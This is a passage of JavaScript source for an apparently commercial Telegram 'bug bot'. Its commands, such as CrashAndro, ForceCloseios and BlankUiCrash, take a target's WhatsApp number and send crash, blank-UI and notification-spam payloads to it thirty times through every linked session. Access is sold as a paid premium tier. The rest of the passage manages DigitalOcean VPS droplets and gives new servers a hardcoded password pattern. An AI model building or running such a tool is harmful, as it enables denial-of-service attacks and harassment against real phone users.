const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /kirim 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/bprwxm.jpg",
    filename: "ᔫ 𖣂 𝐓͢𝐇͡𝐄͢'''𝐖͡𝐎͢𝐋͡𝐅 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🐉 𝐙𝐞𝐱 ☇ Kirim˚Paket 𖣂\`\`\`
alvo: ${target}
menu : Panel
status: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🦋 por que mano
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤", callback_data: "PaketPilihan" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 30; i++) {
          await RoUiblank(sock, target, Ptcp = true);
          await Blank(sock, target, ptcp = true);
          await SpamNotif(sock, target, Ptcp = true); 
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim paket:", err);
  }
});
bot.command('CrashAndro', async (ctx) => {
const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /kirim 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/bprwxm.jpg",
    filename: "ᔫ 𖣂 𝐓͢𝐇͡𝐄͢'''𝐖͡𝐎͢𝐋͡𝐅 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🐉 𝐙𝐞𝐱 ☇ Kirim˚Paket 𖣂\`\`\`
alvo: ${target}
menu : Panel
status: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🦋 por que mano
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤", callback_data: "PaketPilihan" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 30; i++) {
          await RoUiblank(sock, target, Ptcp = true);
          await Blank(sock, target, ptcp = true);
          await SpamNotif(sock, target, Ptcp = true); 
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim paket:", err);
  }
});
bot.command('ForceCloseios', async (ctx) => {
const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /kirim 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/bprwxm.jpg",
    filename: "ᔫ 𖣂 𝐓͢𝐇͡𝐄͢'''𝐖͡𝐎͢𝐋͡𝐅 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🐉 𝐙𝐞𝐱 ☇ Kirim˚Paket 𖣂\`\`\`
alvo: ${target}
menu : Panel
status: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🦋 por que mano
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤", callback_data: "PaketPilihan" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 30; i++) {
          await RoUiblank(sock, target, Ptcp = true);
          await Blank(sock, target, ptcp = true);
          await SpamNotif(sock, target, Ptcp = true); 
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim paket:", err);
  }
});
bot.command('BlankUiCrash', async (ctx) => {
const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  const args = ctx.message.text.split(" ");
  const q = args[1];

  if (!q) {
    return ctx.reply(`Contoh: /kirim 628xxx`);
  }

  const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  await ctx.replyWithDocument({
    url: "https://files.catbox.moe/bprwxm.jpg",
    filename: "ᔫ 𖣂 𝐓͢𝐇͡𝐄͢'''𝐖͡𝐎͢𝐋͡𝐅 𖣂 ᔮ.jpg"
  }, {
    caption: `\`\`\`
🐉 𝐙𝐞𝐱 ☇ Kirim˚Paket 𖣂\`\`\`
alvo: ${target}
menu : Panel
status: ✅

\`\`\`𝐋𝐞𝐬𝐬˚𝐐𝐮𝐞𝐫𝐲\`\`\`
🦋 por que mano
    `.trim(),
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "𝐁𝐚𝐜𝐤", callback_data: "PaketPilihan" }]
      ]
    }
  });

  try {
    if (sessions.size === 0) return;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        if (!sock.user) continue;

        for (let i = 0; i < 30; i++) {
          await RoUiblank(sock, target, Ptcp = true);
          await Blank(sock, target, ptcp = true);
          await SpamNotif(sock, target, Ptcp = true); 
        }

      } catch (err) {
        console.log(`Gagal pada bot ${botNum}`);
      }
    }
  } catch (err) {
    console.error("Terjadi error saat proses kirim paket:", err);
  }
});

//list bot
bot.command('listsender', async (ctx) => {
  const chatId = ctx.chat.id;
const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  try {
    if (sessions.size === 0) {
      return ctx.reply(
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let sock = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${sock}. ${botNumber}\n`;
      sock++;
    }

    ctx.reply(
      `#- 𝘓 𝘐 𝘚 𝘛 - 𝘉 𝘖 𝘛
╰➤ Daftar bot yang terhubung\n\n▢ ${botList}`,
      { parse_mode: "Markdown" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    ctx.reply(
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});


bot.command('grouponly', (ctx) => {
  const userId = ctx.from.id.toString();

const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

  botForGroup = true;
  botForPrivateChat = false;
  ctx.reply(`
╭──(  ✅ Success    ) 
│ Bot diatur untuk hanya merespon di Grup!
╰━━━ㅡ━━━━━ㅡ━━━━━━⬣`);
});

// Command untuk addsender WhatsApp
bot.command("addsender", async (ctx) => {
    const args = ctx.message.text.split(" ");
    const senderId = String(ctx.from.id);

const isPremium = isPremiumNow(senderId);
const isOwner = isOwnerId(senderId);

if (!isPremium && !isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addsender <nomor_wa>");
    }

    const inputNumber = args[1];
    const botNumber = inputNumber.replace(/[^0-9]/g, "");
    const chatId = ctx.chat.id;

    try {
        await connectToWhatsApp(botNumber, ctx);
    } catch (error) {
        console.error("Error in addsender:", error);
        await ctx.reply("❌ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi.");
    }
});

bot.command("addpremium", async (ctx) => {
  if (!isOwnerId(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 2) return ctx.reply("❌ Format: /addpremium <user_id> <hari>");

  const userId = String(args[0]);
  const days = Number(args[1]);
  if (!userId || isNaN(days) || days < 1) return ctx.reply("❌ Hari harus angka minimal 1!");

  const premiumUsers = loadJson(PREMIUM_FILE);
  const now = Date.now();

  const current = premiumUsers[userId] ? new Date(premiumUsers[userId]).getTime() : 0;
  const base = current > now ? current : now;

  const newExpire = new Date(base + days * 24 * 60 * 60 * 1000).toISOString();
  premiumUsers[userId] = newExpire;

  saveJson(PREMIUM_FILE, premiumUsers);
  return ctx.reply(`✅ User ${userId} premium ${days} hari.\nAktif sampai: ${new Date(newExpire).toLocaleString("id-ID")}`);
});

bot.command("delpremium", async (ctx) => {
  if (!isOwnerId(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  const args = ctx.message.text.split(" ").slice(1);
  if (args.length < 1) return ctx.reply("❌ Format: /delpremium <user_id>");

  const userId = String(args[0]);
  const premiumUsers = loadJson(PREMIUM_FILE);

  if (!premiumUsers[userId]) return ctx.reply(`❌ User ${userId} bukan premium.`);

  delete premiumUsers[userId];
  saveJson(PREMIUM_FILE, premiumUsers);
  return ctx.reply(`✅ User ${userId} dihapus dari premium.`);
});

bot.command("listpremium", async (ctx) => {
  if (!isOwnerId(ctx.from.id)) return ctx.reply("❌ Kamu bukan owner!");

  const premiumUsers = loadJson(PREMIUM_FILE);
  const ids = Object.keys(premiumUsers || {});
  if (!ids.length) return ctx.reply("📭 Tidak ada user premium.");

  const now = Date.now();
  let text = "👑 Daftar User Premium:\n\n";

  let i = 1;
  for (const id of ids) {
    const exp = new Date(premiumUsers[id]).getTime();
    const status = exp > now ? "✅ Aktif" : "❌ Expired";
    text += `${i}. ${id}\n   ${status}\n   Expire: ${new Date(exp).toLocaleString("id-ID")}\n\n`;
    i++;
  }

  return ctx.reply(text.trim());
});

bot.command("cekprem", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1);
  const userId = args[0] ? String(args[0]) : String(ctx.from.id);

  const premiumUsers = loadJson(PREMIUM_FILE);
  if (!premiumUsers[userId]) return ctx.reply(`❌ ${userId} bukan premium.`);

  const exp = new Date(premiumUsers[userId]).getTime();
  if (exp > Date.now()) {
    return ctx.reply(`✅ ${userId} premium sampai: ${new Date(exp).toLocaleString("id-ID")}`);
  }
  return ctx.reply(`❌ ${userId} premium sudah expired.`);
});

// /cvps <hostname> - Menampilkan pilihan spesifikasi VPS
bot.command('cvps', async (ctx) => {
  const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}
  const args = ctx.message.text.split(' ');
  const hostname = args.slice(1).join(' ').trim();

  if (!hostname) {
    return ctx.reply('Contoh penggunaan:\n/cvps myhostname');
  }

const rows = [
  { title: "Ram 32GB || CPU 8", id: `cvps1 /r32c8 ${hostname}` },
  { title: "Ram 16GB || CPU 4", id: `cvps1 /r16c4 ${hostname}` },
  { title: "Ram 8GB || CPU 4",  id: `cvps1 /r8c4 ${hostname}` },
  { title: "Ram 4GB || CPU 2",  id: `cvps1 /r4c2 ${hostname}` },
  { title: "Ram 2GB || CPU 2",  id: `cvps1 /r2c2 ${hostname}` },
  { title: "Ram 2GB || CPU 1",  id: `cvps1 /r2c1 ${hostname}` },
  { title: "Ram 1GB || CPU 1",  id: `cvps1 /r1c1 ${hostname}` },
];

  const keyboard = {
    inline_keyboard: rows.map(row => [{
      text: row.title,
      callback_data: row.id
    }])
  };

  await ctx.reply("📦 *Pilih Spesifikasi VPS yang Tersedia:*\nKlik salah satu untuk deploy.", {
    reply_markup: keyboard,
    parse_mode: "Markdown"
  });
});

/* ───────────────────────────────────────────────
   1) Command /cvps  ─ pilih akun DigitalOcean
──────────────────────────────────────────────── */
bot.command('cvps2', async ctx => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

  const hostname = ctx.message.text.split(' ').slice(1).join('-')
                    .replace(/[^a-zA-Z0-9-_]/g, '');
  if (!hostname) return ctx.reply('📌 Contoh: /cvps my-vps');

  const keys = Object.keys(global.apiAkunDigitalOcean);
  if (!keys.length) return ctx.reply('❌ Tidak ada akun DigitalOcean yang tersedia.');

  const keyboard = keys.map((key, i) => {
    const valid = global.apiAkunDigitalOcean[key]?.length >= 64;
    return [ Markup.button.callback(
      valid ? `✅ Akun DO #${i+1}` : `❌ API Key #${i+1} invalid`,
      `cvps_acc_${i+1}_${hostname}`
    ) ];
  });

  ctx.reply(
    `📦 Hostname *${hostname}*\nPilih akun DigitalOcean:`,
    { parse_mode:'Markdown', reply_markup:Markup.inlineKeyboard(keyboard) }
  );
});

/* ───────────────────────────────────────────────
   2) Callback ─ pilih OS + spesifikasi
──────────────────────────────────────────────── */
const osList = [
  { t:"# Ubuntu 22.04 LTS x64", slug:"ubuntu-22-04-x64" },
  { t:"# Ubuntu 24.04 LTS x64", slug:"ubuntu-24-04-x64" },
  { t:"# Debian 11 x64",        slug:"debian-11-x64"   },
  { t:"# Debian 12 x64",        slug:"debian-12-x64"   },
  { t:"# CentOS Stream 9 x64",  slug:"centos-stream-9-x64" },
];

const specs = [
  { r:1,  c:1 }, { r:2,  c:1 }, { r:2,  c:2 },
  { r:4,  c:2 }, { r:8,  c:4 }, { r:16, c:4 },
  { r:16, c:8 }, { r:32, c:8 },
];

/* ───────────────────────────────────────────────
   3) Helper - size slug DigitalOcean
──────────────────────────────────────────────── */
function getSizeSlug(ram, cpu) {
  const map = {
    '1-1':  's-1vcpu-1gb',
    '2-1':  's-1vcpu-2gb',
    '2-2':  's-2vcpu-2gb',
    '4-2':  's-2vcpu-4gb',
    '8-4':  's-4vcpu-8gb',
    '16-4': 's-4vcpu-16gb',
    '16-8': 's-8vcpu-16gb',
    '32-8': 's-8vcpu-32gb',
  };
  return map[`${ram}-${cpu}`] || 's-1vcpu-1gb';
}

/* ───────────────────────────────────────────────
   4) createVPS  –  panggil API DigitalOcean
──────────────────────────────────────────────── */
async function CVPS(
  apiKey,
  { hostname, image, size, region='sgp1' }
) {
  const payload = {
    name : hostname,
    region, size, image,
    ipv6: true, monitoring: true,
    tags : ['telegram-bot'],
  };
  const { data } = await axios.post(
    'https://api.digitalocean.com/v2/droplets',
    payload,
    { headers:{
        Authorization: `Bearer ${apiKey}`,
        'Content-Type':'application/json'
      }}
  );
  const d  = data.droplet;
  const ip = d.networks.v4.find(n=>n.type==='public')?.ip_address ?? 'menunggu IP';

  return {
    name: d.name,
    region: d.region.slug,
    ip_address: ip,
    status: d.status
  };
}

// /createvps r2c1_v1 hostname,os,region => langsung buat VPS
bot.command('createvps', async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

  const text = ctx.message.text.split(' ').slice(1).join(' ');
  if (!text || !text.includes('_v') || !text.includes(',')) {
    return ctx.reply('Contoh:\n/createvps r2c1_v1 namaserver,ubuntu-22-04-x64,sgp1');
  }

  try {
    const [spec, rest] = text.split(' ');
    const [hostname, os, region] = rest.split(',');
    const version = parseInt(spec.split('_v')[1]);
    const ram = parseInt(spec.match(/r(\d+)c/)[1]);
    const core = parseInt(spec.match(/c(\d+)/)[1]);

    const apikey = global.apiAkunDigitalOcean?.[`akun${version}`];
    if (!apikey) return ctx.reply(`❌ API Key akun${version} tidak ditemukan atau belum diset`);

    const sizeMap = {
      '1-1': 's-1vcpu-1gb-amd',
      '2-1': 's-1vcpu-2gb-amd',
      '2-2': 's-2vcpu-2gb-amd',
      '4-2': 's-2vcpu-4gb-amd',
      '8-4': 's-4vcpu-8gb-amd',
      '16-4': 's-4vcpu-16gb-amd',
      '16-8': 's-8vcpu-16gb-amd',
      '32-8': 's-8vcpu-32gb-amd'
    };

    const sizeSlug = sizeMap[`${ram}-${core}`];
    if (!sizeSlug) return ctx.reply('❌ Kombinasi RAM/CPU tidak valid');

    const password = `GALAXY#${ram}GB`;
    const dropletData = {
      name: hostname,
      region,
      size: sizeSlug,
      image: os,
      backups: false,
      ipv6: true,
      user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
      tags: ['telegram-bot']
    };

    await ctx.reply('🚀 Sedang membuat VPS, tunggu ±1 menit...');

    const res = await fetch("https://api.digitalocean.com/v2/droplets", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${apikey}`
      },
      body: JSON.stringify(dropletData)
    });

    const json = await res.json();
    if (!res.ok) {
      return ctx.reply(`❌ Gagal membuat VPS:\n${json.message || 'Tidak diketahui'}`);
    }

    const dropletId = json.droplet.id;
    await new Promise(resolve => setTimeout(resolve, 60000)); // tunggu 1 menit

    const det = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
      headers: {
        Authorization: `Bearer ${apikey}`
      }
    });

    const detJson = await det.json();
    const ip = detJson.droplet.networks.v4.find(x => x.type === 'public')?.ip_address || 'Tidak ditemukan';

    return ctx.replyWithMarkdown(`
✅ *VPS Berhasil Dibuat!*
🖥️ *Hostname:* \`${hostname}\`
🌐 *IP:* \`${ip}\`
🔐 *Password:* \`${password}\`
📦 *Spec:* ${ram}GB RAM, ${core}C CPU
📤 *Region:* \`${region}\`
📁 *OS:* \`${os}\`
🔑 *Akun:* V${version}
🧾 *ID:* \`${dropletId}\`
`);
  } catch (e) {
    console.error(e);
    ctx.reply('⚠️ Terjadi kesalahan saat membuat VPS.');
  }
});

bot.command('sisadroplet', async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

    let messages = [];
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiAkunDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            const [accountRes, dropletsRes] = await Promise.all([
                fetch("https://api.digitalocean.com/v2/account", {
                    headers: { Authorization: `Bearer ${apiKey}` }
                }),
                fetch("https://api.digitalocean.com/v2/droplets", {
                    headers: { Authorization: `Bearer ${apiKey}` }
                })
            ]);

            if (!accountRes.ok || !dropletsRes.ok) {
                errors.push(`⊡══════════════════════⊡\n❌ Akun DigitalOcean V${version}: Gagal mendapatkan data`);
                continue;
            }

            const accountData = await accountRes.json();
            const dropletsData = await dropletsRes.json();

            const dropletLimit = accountData.account.droplet_limit;
            const totalDroplets = dropletsData.droplets.length;
            const remainingDroplets = dropletLimit - totalDroplets;

            messages.push(
                `⊡══════════════════════⊡\n` +
                `🌟 *Akun DigitalOcean V${version}*\n` +
                `📌 *Batas Maksimum Droplet:* ${dropletLimit}\n` +
                `🚀 *Total Droplet Terpakai:* ${totalDroplets}\n` +
                `✅ *Sisa Droplet Tersedia:* ${remainingDroplets}\n`
            );
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`⊡══════════════════════⊡\n❌ Akun DigitalOcean V${version}: Terjadi kesalahan`);
        }
    }

    if (messages.length === 0) {
        return ctx.reply("❌ Tidak ada akun DigitalOcean yang valid atau API Key tidak dikonfigurasi.");
    }

    let finalMessage = `🌐 *SISA DROPLET DIGITALOCEAN* 🌐\n\n` + messages.join("\n");
    if (errors.length > 0) {
        finalMessage += `\n\n${errors.join("\n")}`;
    }

    await ctx.reply(finalMessage, { parse_mode: 'Markdown' });
});

bot.command('listdroplet', async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

  try {
    let totalVps = 0;
    let akunKeys = Object.entries(global.apiAkunDigitalOcean || {});
    if (akunKeys.length === 0) {
      return ctx.reply("⚠️ Tidak ada API Key DigitalOcean yang tersedia.");
    }

    await ctx.reply(`🔍 Mengambil semua VPS dari ${akunKeys.length} akun...`);

    for (const [key, apiKey] of akunKeys) {
      let version = key.replace("akun", "");
      if (!apiKey || !apiKey.startsWith("dop_v1_")) {
        await ctx.reply(`❌ Akun V${version} tidak valid atau belum dikonfigurasi`);
        continue;
      }

      const res = await fetch("https://api.digitalocean.com/v2/droplets", {
        headers: { Authorization: `Bearer ${apiKey}` }
      });

      const json = await res.json();
      const droplets = json.droplets || [];

      if (!res.ok) {
        await ctx.reply(`❌ Gagal mengambil droplet Akun V${version}:\n${json.message || 'Unknown error'}`);
        continue;
      }

      if (droplets.length === 0) {
        await ctx.reply(`🌐 Akun V${version}:\n🚫 Tidak ada droplet.`);
        continue;
      }

      totalVps += droplets.length;

      let msg = `🌐 *Akun DigitalOcean V${version}*\n📊 Total Droplet: ${droplets.length}\n\n`;
      droplets.forEach((d, i) => {
        const ip = d.networks.v4.find(n => n.type === 'public')?.ip_address || 'Tidak ada IP';
        msg += `🔹 *${i + 1}. ${d.name}*\n`;
        msg += `  ➤ ID: \`${d.id}\`\n`;
        msg += `  ➤ IP: \`${ip}\`\n`;
        msg += `  ➤ RAM: ${d.memory} MB | CPU: ${d.vcpus} vCPU\n`;
        msg += `  ➤ OS: ${d.image.distribution} | Disk: ${d.disk} GB\n`;
        msg += `  ➤ Status: ${d.status === "active" ? "✅ Aktif" : "❌ Nonaktif"}\n\n`;
      });

      // Potong jika terlalu panjang
      const chunks = msg.match(/[\s\S]{1,4000}/g);
      for (const chunk of chunks) {
        await ctx.reply(chunk, { parse_mode: "Markdown" });
      }

      await new Promise(r => setTimeout(r, 1000)); // jeda 1 detik
    }

    await ctx.reply(`✅ Selesai! Total VPS ditemukan: ${totalVps}`);

  } catch (err) {
    console.error("❌ Error:", err);
    await ctx.reply("❌ Terjadi kesalahan saat mengambil data droplet.");
  }
});

bot.command('deldroplet', async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply(`Contoh penggunaan:\n/deldroplet IDDroplet`);

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiAkunDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            const dropletList = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!dropletList.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            const data = await dropletList.json();
            const droplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (droplet) {
                found = true;
                const deleteResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: "DELETE",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    }
                });

                if (deleteResponse.ok) {
                    return ctx.reply(`✅ Droplet dengan ID *${dropletId}* berhasil dihapus!\n🌟 *Akun DigitalOcean V${version}*`, { parse_mode: 'Markdown' });
                } else {
                    const errorData = await deleteResponse.json();
                    errors.push(`❌ Akun DigitalOcean V${version}: ${errorData.message || "Kesalahan tidak diketahui"}`);
                }
            }
        } catch (error) {
            console.error(`Error di akun V${version}:`, error);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return ctx.reply(errorMessage, { parse_mode: 'Markdown' });
    }
});

bot.command('rebuild', async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply(`Contoh penggunaan:\n/rebuild IDDroplet`);

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiAkunDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

                let rebuildResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    },
                    body: JSON.stringify({ type: "rebuild", image: "ubuntu-20-04-x64" })
                });

                let rebuildData = await rebuildResponse.json();

                if (!rebuildResponse.ok) {
                    return ctx.reply(`❌ Gagal melakukan rebuild VPS:\n🌟 *Akun DigitalOcean V${version}*\n${rebuildData.message || "Terjadi kesalahan"}`, { parse_mode: 'Markdown' });
                }

                await ctx.reply(`🔄 *Rebuild VPS sedang diproses...*\n📡 *Droplet ID:* ${dropletId}\n🌟 *Akun DigitalOcean V${version}*\n⏳ *Status:* ${rebuildData.action.status}`, { parse_mode: 'Markdown' });

                await new Promise(resolve => setTimeout(resolve, 60000));

                let vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: "GET",
                    headers: {
                        "Content-Type": "application/json",
                        "Authorization": `Bearer ${apiKey}`
                    }
                });

                if (!vpsInfo.ok) {
                    return ctx.reply("❌ Gagal mendapatkan informasi VPS setelah rebuild!");
                }

                let vpsData = await vpsInfo.json();
                let droplet = vpsData.droplet;
                let ipAddress = droplet.networks.v4.find(net => net.type === "public")?.ip_address || "Tidak ada IP!";
                
                let textvps = `✅ *VPS BERHASIL DI REBUILD*\n\n📡 *IP VPS:* ${ipAddress}\n💾 *Sistem Image:* ${droplet.image.slug}`;
                return await ctx.reply(textvps, { parse_mode: 'Markdown' });
            }
        } catch (err) {
            console.error(`Error di akun V${version}:`, err);
            errors.push(`❌ Akun DigitalOcean V${version}: Gagal menghubungi API`);
        }
    }

    if (!found) {
        let errorMessage = `❌ VPS dengan ID *${dropletId}* tidak ditemukan di akun mana pun.\n`;
        if (errors.length > 0) {
            errorMessage += `\n${errors.join("\n")}`;
        }
        return ctx.reply(errorMessage, { parse_mode: 'Markdown' });
    }
});

bot.command('restartvps', async (ctx) => {
const senderId = String(ctx.from.id);
const isOwner = isOwnerId(senderId);
if (!isOwner) {
  return ctx.reply("Perintah Hanya Untuk User Premium / Owner.", {
    reply_markup: { inline_keyboard: [[{ text: "Hubungi Developer", url: "https://t.me/Rizzxtzy" }]] }
  });
}

    const text = ctx.message.text.split(" ").slice(1).join(" ");
    if (!text) return ctx.reply(`Contoh penggunaan:\n/restartvps IDDroplet`);

    let dropletId = text.trim();
    let found = false;
    let errors = [];

    for (const [key, apiKey] of Object.entries(global.apiAkunDigitalOcean)) {
        let version = key.replace("akun", "");

        if (!apiKey || apiKey.length < 64) continue;

        try {
            let response = await fetch("https://api.digitalocean.com/v2/droplets", {
                headers: { Authorization: `Bearer ${apiKey}` }
            });

            if (!response.ok) {
                errors.push(`❌ Akun DigitalOcean V${version}: API key tidak valid`);
                continue;
            }

            let data = await response.json();
            let matchedDroplet = data.droplets.find(d => d.id.toString() === dropletId);

            if (matchedDroplet) {
                found = true;

